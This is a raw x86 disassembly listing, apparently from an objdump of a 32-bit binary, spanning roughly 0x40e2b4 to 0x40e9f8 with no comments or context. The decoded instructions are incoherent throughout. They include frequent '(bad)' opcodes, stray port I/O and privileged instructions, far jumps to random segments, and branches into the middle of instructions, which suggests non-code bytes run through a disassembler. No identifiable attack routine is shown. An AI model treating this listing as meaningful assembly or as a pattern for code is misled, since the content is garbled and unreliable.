  40e2b4:	in     al,dx
  40e2b5:	mov    ebx,0xec0a82bd
  40e2ba:	test   al,0x57
  40e2bc:	xor    eax,0x2a8e6ce0
  40e2c1:	mov    cl,BYTE PTR [eax+eax*1]
  40e2c4:	jg     0x40e2c8
  40e2c6:	jnp    0x40e305
  40e2c8:	icebp  
  40e2c9:	mov    ds:0x69ce7cbb,al
  40e2ce:	je     0x40e2d4
  40e2d0:	mov    ch,ch
  40e2d2:	mov    cl,0xd
  40e2d4:	jmp    0x40e2cd
  40e2d6:	adc    BYTE PTR [edi+0x42],0x46
  40e2da:	sti    
  40e2db:	adc    ebp,esp
  40e2dd:	mov    dl,0x4e
  40e2df:	mov    eax,0x5cce1088
  40e2e4:	mov    al,ds:0x85d5a253
  40e2e9:	bndldx (bad),[ecx+eax*1+0x2a]
  40e2ee:	jo     0x40e2fe
  40e2f0:	ja     0x40e333
  40e2f2:	mov    dh,0xde
  40e2f4:	and    BYTE PTR [eax],al
  40e2f6:	mov    gs,WORD PTR [ebx+0x11]
  40e2f9:	push   edi
  40e2fa:	dec    ecx
  40e2fb:	call   0xa140e328
  40e300:	jge    0x40e342
  40e302:	ds iret 
  40e304:	in     eax,0xae
  40e306:	aaa    
  40e307:	out    dx,al
  40e308:	xchg   edx,eax
  40e309:	pop    edi
  40e30a:	push   0x61
  40e30c:	sbb    DWORD PTR [ebx-0x283638d8],ebx
  40e312:	popw   ds
  40e314:	mov    WORD PTR [ecx-0x23cfea7],?
  40e31a:	rol    BYTE PTR [ebx+0x0],cl
  40e31d:	enter  0x47a4,0x15
  40e321:	out    dx,eax
  40e322:	and    cl,BYTE PTR [ecx]
  40e324:	rol    eax,1
  40e326:	and    al,0x90
  40e328:	xlat   BYTE PTR ds:[ebx]
  40e329:	inc    edx
  40e32a:	pop    eax
  40e32b:	addr16 adc bl,dl
  40e32e:	stc    
  40e32f:	call   0x203e:0xbc009551
  40e336:	jno    0x40e33c
  40e338:	xor    DWORD PTR [ecx+0x7ad5d4a6],eax
  40e33e:	cdq    
  40e33f:	mov    ebx,0x95c3caa9
  40e344:	std    
  40e345:	dec    ebx
  40e346:	outs   dx,BYTE PTR ds:[esi]
  40e347:	xor    al,0x3c
  40e349:	outs   dx,DWORD PTR ds:[esi]
  40e34a:	push   esp
  40e34b:	jmp    0x262e:0xa1287a29
  40e352:	xor    al,0x1e
  40e354:	mov    al,ds:0x8f89c9cb
  40e359:	or     BYTE PTR [esi-0x6b],0x50
  40e35d:	cld    
  40e35e:	call   0x3fe9:0x36ad2954
  40e365:	stos   BYTE PTR es:[edi],al
  40e366:	into   
  40e367:	push   esi
  40e368:	sti    
  40e369:	and    esp,DWORD PTR [esi]
  40e36b:	ds jmp 0x6bf9:0xa5d72dd5
  40e373:	ins    BYTE PTR es:[edi],dx
  40e374:	mov    esi,0x309c9117
  40e379:	sbb    eax,0x4dbff43b
  40e37e:	xchg   edi,eax
  40e37f:	ins    BYTE PTR es:[edi],dx
  40e380:	mov    dh,0xb7
  40e382:	xor    al,0xac
  40e384:	jb     0x40e3dd
  40e386:	stos   DWORD PTR es:[edi],eax
  40e387:	gs inc ecx
  40e389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e38a:	dec    edx
  40e38b:	or     BYTE PTR [esi],ah
  40e38d:	mov    dl,0x2a
  40e38f:	sbb    eax,0xc4667887
  40e394:	dec    edi
  40e395:	and    cl,BYTE PTR [esi+0x63bd13ec]
  40e39b:	adc    al,0x97
  40e39d:	xchg   edi,eax
  40e39e:	mov    ds:0x5596cd3b,eax
  40e3a3:	mov    ebp,0x29657bbc
  40e3a8:	inc    ebp
  40e3a9:	cmp    BYTE PTR [ecx+0x39],cl
  40e3ac:	lahf   
  40e3ad:	sti    
  40e3ae:	ss or  bl,ch
  40e3b1:	sub    esp,DWORD PTR [ecx+0x76]
  40e3b4:	add    DWORD PTR [edi-0x3d],edi
  40e3b7:	and    cl,BYTE PTR [ebx+0x7a3defd4]
  40e3bd:	cdq    
  40e3be:	push   esi
  40e3bf:	xchg   esi,eax
  40e3c0:	inc    ebx
  40e3c1:	mov    edx,DWORD PTR [ebx-0x4129886f]
  40e3c7:	xor    eax,0x1a0475bd
  40e3cc:	fadd   DWORD PTR ds:0xe3aa80f3
  40e3d2:	mov    esp,0x14b2047d
  40e3d7:	rcr    DWORD PTR ds:0xf753fbaf,cl
  40e3dd:	adc    BYTE PTR [ecx+0x71cad41f],ch
  40e3e3:	adc    DWORD PTR [ebp+ebx*1+0x65],eax
  40e3e7:	or     eax,0x2cbf7e59
  40e3ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3ed:	sbb    dl,0x2e
  40e3f0:	lods   al,BYTE PTR ds:[esi]
  40e3f1:	mov    ebx,0x89fdabc2
  40e3f6:	(bad)  
  40e3f7:	std    
  40e3f8:	ins    DWORD PTR es:[edi],dx
  40e3f9:	sbb    al,BYTE PTR [ecx+0x33]
  40e3fc:	jbe    0x40e3ab
  40e3fe:	lods   eax,DWORD PTR ds:[esi]
  40e3ff:	fscale 
  40e401:	nop
  40e402:	imul   esp,DWORD PTR [ecx-0x5fb24a60],0x6d
  40e409:	inc    ebp
  40e40a:	sti    
  40e40b:	cmp    al,0x55
  40e40d:	jae    0x40e3a0
  40e40f:	sti    
  40e410:	inc    edx
  40e411:	cdq    
  40e412:	push   es
  40e413:	hlt    
  40e414:	aad    0x64
  40e416:	xchg   edx,eax
  40e417:	cmp    dl,ah
  40e419:	repz push ebx
  40e41b:	fiadd  DWORD PTR [edx-0x30c20ba0]
  40e421:	inc    ecx
  40e422:	mov    ebx,0x7df8f7ef
  40e427:	enter  0xaf06,0x8c
  40e42b:	and    BYTE PTR [esi+0x1e091256],ch
  40e431:	retf   0xcf9
  40e434:	sti    
  40e435:	es push ebp
  40e437:	cmp    edx,DWORD PTR [ecx]
  40e439:	mov    bh,0x74
  40e43b:	xlat   BYTE PTR ds:[ebx]
  40e43d:	ja     0x40e3c0
  40e43f:	pop    ecx
  40e440:	mov    ecx,0x79718a5
  40e445:	and    esp,DWORD PTR [ebx]
  40e447:	sub    edx,DWORD PTR [eax]
  40e449:	jmp    0x6678:0xcfe279bc
  40e450:	pop    eax
  40e451:	mov    cl,0xa7
  40e453:	mov    edx,0x337ba9cd
  40e458:	imul   esi,DWORD PTR [esi],0x5d
  40e45b:	sub    BYTE PTR [ecx+0x48b190dc],ah
  40e461:	add    BYTE PTR [ebx-0xd8790fa],al
  40e467:	mov    cl,0x67
  40e469:	mov    WORD PTR [edi-0x3912c78d],?
  40e46f:	daa    
  40e470:	dec    ecx
  40e471:	rol    DWORD PTR [ecx+0x18d5b3fd],1
  40e477:	stos   BYTE PTR es:[edi],al
  40e478:	inc    edi
  40e479:	nop
  40e47a:	ror    esi,cl
  40e47c:	inc    edi
  40e47d:	(bad)  
  40e47e:	push   0xbd10a4be
  40e483:	pop    edi
  40e484:	fwait
  40e485:	cmp    dh,dl
  40e487:	int3   
  40e488:	adc    DWORD PTR ds:0xc3fbc289,esp
  40e48e:	dec    eax
  40e48f:	imul   edi,esi,0xffffffa8
  40e492:	call   0xb447:0xb872e36d
  40e499:	mov    edx,0x46f9946b
  40e49e:	xor    al,BYTE PTR ds:0x3e9d3987
  40e4a4:	mov    bl,0xf8
  40e4a6:	and    cl,cl
  40e4a8:	stc    
  40e4a9:	inc    ebp
  40e4aa:	mov    ebx,0xbd4c78ea
  40e4af:	inc    ebp
  40e4b0:	jg     0x40e440
  40e4b2:	shr    BYTE PTR gs:[edx+0xcafbf29],1
  40e4b9:	stos   DWORD PTR es:[edi],eax
  40e4ba:	cmc    
  40e4bb:	lahf   
  40e4bc:	pop    es
  40e4bd:	and    al,0xb5
  40e4bf:	adc    eax,0x8772ab4e
  40e4c4:	mov    WORD PTR [edi+0xdb3b403],gs
  40e4ca:	mov    bl,0x3a
  40e4cc:	ins    DWORD PTR es:[edi],dx
  40e4cd:	js     0x40e4e2
  40e4cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4d0:	pop    esi
  40e4d1:	ror    BYTE PTR [edx-0x2b61bdd9],cl
  40e4d7:	cmp    al,0x87
  40e4d9:	or     DWORD PTR [esi],0x372bad4
  40e4df:	push   cs
  40e4e0:	dec    esi
  40e4e1:	ja     0x40e504
  40e4e3:	inc    esp
  40e4e4:	ret    0xf8dc
  40e4e7:	jl     0x40e536
  40e4e9:	idiv   BYTE PTR [ebp-0x6c]
  40e4ec:	dec    ebp
  40e4ed:	lods   eax,DWORD PTR ds:[esi]
  40e4ee:	xor    al,0x82
  40e4f1:	mov    cl,0x72
  40e4f3:	das    
  40e4f4:	inc    esi
  40e4f5:	add    ebp,DWORD PTR ds:0xfe28b194
  40e4fb:	sar    dh,0x8
  40e4fe:	xlat   BYTE PTR ds:[ebx]
  40e4ff:	cmp    bh,BYTE PTR [edx-0x5387cd32]
  40e505:	push   ecx
  40e506:	jne    0x40e4f0
  40e508:	add    eax,eax
  40e50a:	test   al,0x79
  40e50c:	push   edi
  40e50d:	ficom  WORD PTR [edi-0x3f8d1b94]
  40e513:	xchg   esp,eax
  40e514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e515:	dec    ebx
  40e516:	mov    ds:0xcf61863b,eax
  40e51b:	mov    ah,al
  40e51d:	(bad)  
  40e51e:	loopne 0x40e532
  40e520:	loopne 0x40e4eb
  40e522:	jo     0x40e4fa
  40e524:	loopne 0x40e4ea
  40e526:	rcr    BYTE PTR [eax+0x3292b357],0x60
  40e52d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e52e:	mov    al,0xe0
  40e530:	leave  
  40e531:	sub    edi,eax
  40e533:	scas   al,BYTE PTR es:[edi]
  40e534:	cld    
  40e535:	stos   BYTE PTR es:[edi],al
  40e536:	mov    ch,0x2a
  40e538:	or     BYTE PTR ds:0x757df6fc,bh
  40e53e:	sub    ah,BYTE PTR [ebp+0x6a653c80]
  40e544:	out    dx,al
  40e545:	mov    edi,0x54cbec0e
  40e54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e54b:	leave  
  40e54c:	dec    esi
  40e54d:	ret    0x4382
  40e550:	xor    eax,0x34f7ad8c
  40e555:	push   ebx
  40e556:	cmp    esp,edx
  40e558:	ss cmp al,0x1a
  40e55b:	in     al,dx
  40e55c:	push   edx
  40e55d:	loope  0x40e55e
  40e55f:	imul   edx,edx,0x184c4cb9
  40e565:	iret   
  40e566:	gs jmp 0xcb2d5729
  40e56c:	mov    DWORD PTR [edi],eax
  40e56e:	mov    al,ds:0xd6df1867
  40e573:	lea    edi,[esi-0x6644371e]
  40e579:	sbb    dh,BYTE PTR [edi]
  40e57b:	lods   al,BYTE PTR ds:[esi]
  40e57c:	fdivr  st,st(1)
  40e57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e57f:	dec    ecx
  40e580:	shl    DWORD PTR [esi-0x31ce3cc9],1
  40e586:	scas   eax,DWORD PTR es:[edi]
  40e587:	sbb    bl,bh
  40e589:	pop    ebx
  40e58a:	pop    ss
  40e58b:	out    0x3d,eax
  40e58d:	(bad)  
  40e58e:	addr16 mov cl,0x97
  40e591:	and    esi,DWORD PTR [ecx+ecx*1-0x56]
  40e595:	jmp    0x7c4ed95d
  40e59a:	jno    0x40e5d8
  40e59c:	cld    
  40e59d:	loope  0x40e612
  40e59f:	(bad)  
  40e5a0:	sahf   
  40e5a1:	jmp    0x40e53d
  40e5a3:	adc    al,0x3e
  40e5a5:	push   0xadb3bf38
  40e5aa:	and    bl,BYTE PTR [ebx-0x10cef9a8]
  40e5b0:	and    eax,edi
  40e5b2:	lock pusha 
  40e5b4:	sahf   
  40e5b5:	inc    edi
  40e5b6:	sbb    edx,DWORD PTR [eax]
  40e5b8:	sahf   
  40e5b9:	mov    ecx,0xef3d3aa2
  40e5be:	daa    
  40e5bf:	das    
  40e5c0:	iret   
  40e5c1:	xor    esp,eax
  40e5c3:	popa   
  40e5c4:	mov    dh,0xf8
  40e5c6:	ret    
  40e5c7:	loopne 0x40e618
  40e5c9:	cs push 0x328c528b
  40e5cf:	pusha  
  40e5d0:	jbe    0x40e61c
  40e5d2:	xchg   dh,bl
  40e5d4:	nop
  40e5d5:	pop    esp
  40e5d6:	js     0x40e559
  40e5d8:	stos   BYTE PTR es:[edi],al
  40e5d9:	mov    ecx,0x6b2d3710
  40e5df:	jnp    0x40e625
  40e5e1:	xchg   esi,eax
  40e5e2:	mov    ch,0x3b
  40e5e4:	aam    0x56
  40e5e6:	sub    cl,BYTE PTR [bp-0x37]
  40e5ea:	push   cs
  40e5eb:	mov    dh,0x6
  40e5ed:	js     0x40e618
  40e5ef:	jl     0x40e5c7
  40e5f1:	cmp    eax,0xba09a21a
  40e5f6:	mov    ds:0x5f11124d,eax
  40e5fb:	jge    0x40e653
  40e5fd:	add    ah,BYTE PTR [ebp+0xd895fc3]
  40e603:	jns    0x40e5ad
  40e605:	fcomp  QWORD PTR [edx-0x25cfcca3]
  40e60b:	sbb    bl,dh
  40e60d:	sub    ebx,esi
  40e60f:	call   0xa164c186
  40e614:	mov    bh,0x5c
  40e616:	sbb    eax,0x24232be
  40e61b:	in     al,0xb9
  40e61d:	popf   
  40e61e:	lahf   
  40e61f:	je     0x40e5a6
  40e621:	(bad)  
  40e622:	out    dx,al
  40e623:	cmp    eax,0xc1189127
  40e628:	or     eax,eax
  40e62a:	shr    DWORD PTR [eax],cl
  40e62c:	sbb    ch,bl
  40e62e:	adc    DWORD PTR [edx+0x1c],ebx
  40e631:	sbb    ah,BYTE PTR [esi+eiz*2+0x5b]
  40e635:	jecxz  0x40e61c
  40e637:	push   0x56
  40e639:	and    ebp,DWORD PTR [ebx]
  40e63b:	test   DWORD PTR [eax],edi
  40e63d:	mov    edx,0xe02d6795
  40e642:	ds cld 
  40e644:	icebp  
  40e645:	xchg   ebp,eax
  40e646:	mov    al,ds:0x60209252
  40e64b:	sbb    DWORD PTR [ebx-0x7585f9d4],ebx
  40e651:	add    eax,0xbe818834
  40e656:	cmp    DWORD PTR [ecx],ebp
  40e658:	mov    ah,0x4
  40e65a:	je     0x40e642
  40e65c:	jg     0x40e695
  40e65e:	ds jmp 0x1bd:0x1b707e78
  40e666:	push   esp
  40e667:	sub    DWORD PTR [edx+0x3806b56a],ebp
  40e66d:	sbb    ebx,DWORD PTR [ebx+edi*4+0x4b]
  40e671:	dec    ecx
  40e672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e673:	jne    0x40e60c
  40e675:	inc    edi
  40e676:	(bad)  
  40e678:	mov    ebp,0x2dbd8047
  40e67d:	sbb    bl,cl
  40e67f:	mov    esi,DWORD PTR [ecx-0x40]
  40e682:	cli    
  40e683:	sub    bh,BYTE PTR [eax]
  40e685:	cmp    esi,DWORD PTR [ebx+0x31]
  40e688:	jb     0x40e6ac
  40e68a:	cmp    ch,BYTE PTR [ecx]
  40e68c:	jb     0x40e643
  40e68e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e68f:	in     al,0x94
  40e691:	shl    dl,1
  40e693:	push   0xffffffdc
  40e695:	ins    DWORD PTR es:[edi],dx
  40e696:	dec    ecx
  40e697:	icebp  
  40e698:	mov    dh,0xc4
  40e69a:	add    dh,bl
  40e69c:	fadd   QWORD PTR [esi+0x5d9986e1]
  40e6a2:	mov    bh,0xe3
  40e6a4:	adc    ebp,DWORD PTR [esi+0x50]
  40e6a7:	add    cl,BYTE PTR [ebx-0x5]
  40e6aa:	fucom  st(7)
  40e6ac:	das    
  40e6ad:	out    dx,eax
  40e6ae:	xchg   ecx,eax
  40e6af:	idiv   DWORD PTR [eax]
  40e6b1:	mov    esp,0xaf5679d2
  40e6b6:	cmp    DWORD PTR [eax+0x24c26ede],edx
  40e6bc:	je     0x40e67e
  40e6be:	pusha  
  40e6bf:	xor    BYTE PTR [ecx+eax*2+0x7],al
  40e6c3:	shl    DWORD PTR [esi],0xc2
  40e6c6:	ins    BYTE PTR es:[edi],dx
  40e6c7:	xor    esp,DWORD PTR [ebx-0x484ec187]
  40e6cd:	push   eax
  40e6ce:	out    dx,al
  40e6cf:	inc    ebx
  40e6d0:	and    DWORD PTR [esi-0x4a],ebp
  40e6d3:	sub    al,0x24
  40e6d5:	mov    bl,0x3c
  40e6d7:	jae    0x40e69b
  40e6d9:	xchg   esp,eax
  40e6da:	pop    ebx
  40e6db:	jecxz  0x40e732
  40e6dd:	mov    al,0xac
  40e6df:	rcl    DWORD PTR [edx+ebp*8-0x44fa049],cl
  40e6e6:	push   0x5
  40e6e8:	xchg   DWORD PTR [eax+0x2f],eax
  40e6eb:	adc    esi,ecx
  40e6ed:	pusha  
  40e6ee:	jno    0x40e6c3
  40e6f0:	inc    esi
  40e6f1:	push   eax
  40e6f2:	and    eax,0xdff4953b
  40e6f7:	mov    ebx,0x697f5fb6
  40e6fc:	out    dx,al
  40e6fd:	ss dec ebp
  40e6ff:	aam    0x2a
  40e701:	in     eax,dx
  40e702:	adc    DWORD PTR [eax],0x7a
  40e705:	push   ebp
  40e706:	add    al,0x77
  40e708:	jge    0x40e6e2
  40e70a:	cmp    esp,DWORD PTR [edx]
  40e70c:	jmp    0x40e749
  40e70e:	sub    DWORD PTR [edx],0xffffffa4
  40e711:	fwait
  40e712:	add    DWORD PTR [edx],0xe529e1bc
  40e718:	push   ebp
  40e719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e71a:	ins    BYTE PTR es:[edi],dx
  40e71b:	push   ds
  40e71c:	push   cs
  40e71d:	daa    
  40e71e:	lahf   
  40e71f:	push   ss
  40e720:	xchg   esi,eax
  40e721:	inc    esp
  40e722:	fld    QWORD PTR [eax+0x1a]
  40e725:	adc    ebp,DWORD PTR [ebx-0x7c381ef4]
  40e72b:	aas    
  40e72c:	repz xchg edi,eax
  40e72e:	jnp    0x40e6ed
  40e730:	or     DWORD PTR [edi+eax*2],esp
  40e733:	pop    edx
  40e734:	mov    ch,0x6e
  40e736:	pop    eax
  40e737:	push   es
  40e738:	mov    ss,ebx
  40e73a:	and    ebp,DWORD PTR [esi]
  40e73c:	callw  0x625b
  40e740:	mov    eax,0x7c335ce1
  40e745:	pop    ss
  40e746:	jns    0x40e7b0
  40e748:	jbe    0x40e745
  40e74a:	in     eax,0x83
  40e74c:	mov    al,ds:0xf2282f2f
  40e751:	pushf  
  40e752:	lds    eax,FWORD PTR [di+0x77]
  40e756:	push   esi
  40e757:	rol    DWORD PTR [edx+eiz*2-0x69],1
  40e75b:	pop    ebp
  40e75c:	jno    0x40e7a5
  40e75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e75f:	adc    eax,0x8483685f
  40e764:	popf   
  40e765:	into   
  40e766:	jae    0x40e75e
  40e768:	in     al,0x1d
  40e76a:	sbb    esi,esp
  40e76c:	sbb    eax,0x900abccd
  40e771:	sbb    al,0x4d
  40e773:	aaa    
  40e774:	ror    DWORD PTR [esi-0x633fd017],1
  40e77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e77b:	pop    ds
  40e77c:	(bad)  
  40e77d:	push   ebx
  40e77e:	imul   esi,DWORD PTR [ebp-0x7],0x10
  40e782:	pop    ecx
  40e783:	or     cl,BYTE PTR [ebp+0x1a]
  40e786:	jno    0x40e738
  40e788:	mov    edx,0x13e3e21c
  40e78d:	arpl   WORD PTR [ebx+0x5f99b70c],si
  40e793:	and    DWORD PTR [eax-0x7d],edx
  40e796:	cmp    cl,bh
  40e798:	mov    esi,0xa216a3d8
  40e79d:	xchg   DWORD PTR [eax-0xb],esi
  40e7a0:	je     0x40e7f4
  40e7a2:	jne    0x40e7cd
  40e7a4:	lods   al,BYTE PTR ds:[esi]
  40e7a5:	lods   al,BYTE PTR ds:[esi]
  40e7a6:	adc    BYTE PTR [edx],ah
  40e7a8:	push   ss
  40e7a9:	mov    esi,0xe7f2ef0a
  40e7ae:	rcr    BYTE PTR [esi],0xd7
  40e7b1:	loopne 0x40e812
  40e7b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7b4:	cld    
  40e7b5:	in     al,0xa8
  40e7b7:	shr    DWORD PTR [eax-0x14bf5cbf],cl
  40e7bd:	shl    BYTE PTR [esi-0x41],cl
  40e7c0:	cld    
  40e7c1:	inc    eax
  40e7c2:	jl     0x40e836
  40e7c4:	jge    0x40e810
  40e7c6:	jbe    0x40e7d4
  40e7c8:	jno    0x40e846
  40e7ca:	cmp    DWORD PTR [eax-0x4190e026],ebp
  40e7d0:	test   dh,bl
  40e7d2:	jnp    0x40e78e
  40e7d4:	push   ebx
  40e7d5:	inc    esi
  40e7d6:	xchg   ecx,eax
  40e7d7:	cmp    DWORD PTR ds:0xbf19cdc2,esp
  40e7dd:	ret    0x1d1a
  40e7e0:	aaa    
  40e7e1:	icebp  
  40e7e2:	cwde   
  40e7e3:	popa   
  40e7e4:	ins    BYTE PTR es:[edi],dx
  40e7e5:	test   BYTE PTR [ebp-0x7],dh
  40e7e8:	jno    0x40e7f9
  40e7ea:	fisubr WORD PTR [esi]
  40e7ec:	add    al,0x1b
  40e7ee:	fsubr  DWORD PTR [edi+esi*4]
  40e7f1:	jbe    0x40e7ea
  40e7f3:	mov    ecx,0x99594788
  40e7f8:	xchg   edx,eax
  40e7f9:	ja     0x40e7e8
  40e7fb:	sbb    BYTE PTR [ebp-0x6],ch
  40e7fe:	call   0x2a67715
  40e803:	retf   
  40e804:	fstp   QWORD PTR [ecx]
  40e806:	add    dl,BYTE PTR [ecx-0x7d]
  40e809:	arpl   WORD PTR [ecx-0x57],bx
  40e80c:	pop    eax
  40e80d:	packsswb mm1,QWORD PTR [eax+0x73]
  40e811:	pop    ebx
  40e812:	add    esi,DWORD PTR [eax-0x6a]
  40e815:	and    BYTE PTR [ebx+0x6d4c18c3],0x34
  40e81c:	les    ebx,FWORD PTR fs:[edx]
  40e81f:	push   ebp
  40e820:	mov    esp,0x1d7cefa9
  40e825:	mov    dl,0x7
  40e827:	pusha  
  40e828:	sbb    al,dl
  40e82a:	test   al,0x5f
  40e82c:	ins    DWORD PTR es:[edi],dx
  40e82d:	sbb    eax,0x2df3f393
  40e832:	mov    edx,0x5a21410b
  40e837:	jo     0x40e834
  40e839:	cmp    eax,DWORD PTR [edi]
  40e83b:	cmp    al,0x4d
  40e83d:	pop    ss
  40e83e:	cmp    al,dl
  40e840:	retf   0xe5d1
  40e843:	pop    ecx
  40e844:	fldcw  WORD PTR [edi+0x74796f5c]
  40e84a:	ficomp WORD PTR es:0x6e9a6664
  40e851:	jecxz  0x40e83b
  40e853:	xchg   ebp,eax
  40e854:	idiv   BYTE PTR ds:0x80049373
  40e85a:	mov    eax,ds:0x5855502a
  40e85f:	fsubr  DWORD PTR [edi]
  40e861:	dec    eax
  40e862:	rol    DWORD PTR [bp+0x7bc7],cl
  40e867:	push   esp
  40e868:	leave  
  40e869:	ins    DWORD PTR es:[edi],dx
  40e86a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e86b:	xchg   edi,eax
  40e86c:	div    DWORD PTR [edx]
  40e86e:	cmp    ebp,DWORD PTR [ebx+0x1c]
  40e871:	dec    edx
  40e872:	jle    0x40e8ee
  40e874:	sar    DWORD PTR [edi+eax*4+0x7741781d],1
  40e87b:	and    ebp,edx
  40e87d:	add    eax,0x7fff790a
  40e882:	outs   dx,DWORD PTR ds:[esi]
  40e883:	mov    dh,0x72
  40e885:	mov    bl,0x5d
  40e887:	ret    0x4027
  40e88a:	or     ah,BYTE PTR [edx+0x75]
  40e88d:	mov    cl,0x74
  40e88f:	jl     0x40e886
  40e891:	mov    esi,0xeba097ce
  40e896:	jp     0x40e829
  40e898:	mov    dh,0x69
  40e89a:	jbe    0x40e899
  40e89c:	outs   dx,DWORD PTR ds:[esi]
  40e89d:	cmp    al,0xf
  40e89f:	mov    bh,0x6b
  40e8a1:	push   ebp
  40e8a2:	mov    cs,WORD PTR [edi]
  40e8a4:	push   0x400b4954
  40e8a9:	and    eax,0xd9bd1cc8
  40e8ae:	xor    al,0xd6
  40e8b0:	ins    DWORD PTR es:[edi],dx
  40e8b1:	bound  esi,QWORD PTR [ecx]
  40e8b3:	lods   eax,DWORD PTR ds:[esi]
  40e8b4:	jp     0x40e8f4
  40e8b6:	lods   eax,DWORD PTR ds:[esi]
  40e8b7:	push   edi
  40e8b8:	(bad)  
  40e8b9:	jmp    0x4a0f:0x42b4964f
  40e8c0:	push   ss
  40e8c1:	pop    eax
  40e8c2:	xchg   edx,eax
  40e8c3:	ins    DWORD PTR es:[edi],dx
  40e8c4:	push   esi
  40e8c5:	fbstp  TBYTE PTR [eax-0x7099a5cf]
  40e8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8cc:	xor    cl,BYTE PTR [eax+0x72413bc4]
  40e8d2:	adc    al,0xf7
  40e8d4:	shl    DWORD PTR [ebx+0x3c7e4b48],0x82
  40e8db:	pop    esi
  40e8dc:	and    dl,BYTE PTR [edx+0xa]
  40e8df:	mov    edx,0xa802ef5d
  40e8e4:	(bad)  
  40e8e5:	cli    
  40e8e6:	cmp    DWORD PTR [edx+eax*2],0xb50c6e
  40e8ed:	les    ebx,FWORD PTR [ebx+ebp*8]
  40e8f0:	xor    ah,dl
  40e8f2:	mov    esi,0xcd66844a
  40e8f7:	cmp    al,ch
  40e8f9:	add    ecx,DWORD PTR [ebx+0x1568dc78]
  40e8ff:	out    dx,eax
  40e900:	je     0x40e917
  40e902:	das    
  40e903:	das    
  40e904:	xor    edi,DWORD PTR [ecx]
  40e906:	retf   
  40e907:	int3   
  40e908:	jle    0x40e94e
  40e90a:	or     DWORD PTR [ebp+0x3e],ebp
  40e90d:	inc    bp
  40e90f:	or     ebp,ecx
  40e911:	sub    esp,DWORD PTR [esp+edi*1+0x27]
  40e915:	dec    edx
  40e916:	out    0x81,al
  40e918:	ss ret 
  40e91a:	sub    DWORD PTR [ebx-0x1ac4211e],0xeca135c7
  40e924:	(bad)  
  40e925:	idiv   BYTE PTR [ebx+0x5bca189c]
  40e92b:	aaa    
  40e92c:	lds    ebx,FWORD PTR [esi-0x61f8f99c]
  40e932:	sar    DWORD PTR [edx],cl
  40e934:	or     DWORD PTR [ebx-0x76],esi
  40e937:	loopne 0x40e931
  40e939:	ret    0x8b0
  40e93c:	push   ecx
  40e93d:	mov    ds:0x8ea59346,al
  40e942:	xchg   DWORD PTR [ecx],esi
  40e944:	adc    dh,BYTE PTR [ebx]
  40e946:	das    
  40e947:	dec    esp
  40e948:	dec    eax
  40e949:	jl     0x40e9ae
  40e94b:	ret    
  40e94c:	lds    ebp,FWORD PTR [esi-0x363d84a6]
  40e952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e953:	xchg   ebp,eax
  40e954:	add    al,0xc5
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	push   esi
  40e958:	cmp    edi,edi
  40e95a:	fiadd  DWORD PTR ds:[edi]
  40e95d:	jecxz  0x40e9c5
  40e95f:	fisttp DWORD PTR ds:0xe45b0691
  40e965:	daa    
  40e966:	jl     0x40e95b
  40e968:	push   esi
  40e969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e96a:	or     cl,BYTE PTR [ecx+0x6f]
  40e96d:	sbb    eax,0xf9d89919
  40e972:	mov    ecx,DWORD PTR [edi-0x55feb8b]
  40e978:	pop    ebx
  40e979:	push   ds
  40e97a:	leave  
  40e97b:	push   ecx
  40e97c:	and    dh,BYTE PTR ds:0xfa786251
  40e982:	push   ds
  40e983:	jns    0x40e9c2
  40e985:	mov    eax,0x70f51b6b
  40e98a:	fidivr DWORD PTR [edx]
  40e98c:	and    al,0xa3
  40e98e:	outs   dx,DWORD PTR ds:[esi]
  40e98f:	ret    
  40e990:	hlt    
  40e991:	out    dx,al
  40e992:	(bad)  
  40e993:	xor    edx,DWORD PTR [esi-0x56]
  40e996:	push   ebx
  40e997:	ror    BYTE PTR [eax+ebp*8-0x7df319a0],cl
  40e99e:	mov    bl,0x45
  40e9a0:	dec    esp
  40e9a1:	scas   eax,DWORD PTR es:[edi]
  40e9a2:	fmul   QWORD PTR [edx]
  40e9a4:	int    0xfd
  40e9a6:	lahf   
  40e9a7:	sub    BYTE PTR [eax-0x3e961575],ah
  40e9ad:	and    dh,cl
  40e9af:	mov    BYTE PTR [esi-0x102cb49a],ah
  40e9b5:	fdivp  st(5),st
  40e9b7:	int    0x5d
  40e9b9:	(bad)  
  40e9ba:	mov    BYTE PTR [ebp-0x6c],ch
  40e9bd:	inc    eax
  40e9be:	adc    ebp,edx
  40e9c0:	push   esp
  40e9c1:	rcr    BYTE PTR [ebp+0x69],1
  40e9c4:	loope  0x40ea45
  40e9c6:	(bad)  
  40e9c7:	enter  0x5d33,0x1
  40e9cb:	mov    edx,0x23f312c1
  40e9d0:	stos   BYTE PTR es:[edi],al
  40e9d1:	je     0x40e9cf
  40e9d3:	jecxz  0x40e9b1
  40e9d5:	xor    al,0xe5
  40e9d7:	and    BYTE PTR [eax-0x40],al
  40e9da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9db:	rol    BYTE PTR [edi+edx*2],1
  40e9de:	dec    edi
  40e9df:	mov    eax,0x7e463d5e
  40e9e4:	xor    al,BYTE PTR [esi+0x2b]
  40e9e7:	aam    0x82
  40e9e9:	cmp    edi,DWORD PTR ds:0x235f7e28
  40e9ef:	cs (bad) 
  40e9f2:	xchg   edi,eax
  40e9f3:	pop    esp
  40e9f4:	int3   
  40e9f5:	jl     0x40ea6e
  40e9f7:	sahf   
  40e9f8:	or     DWORD PTR [esi],0x17
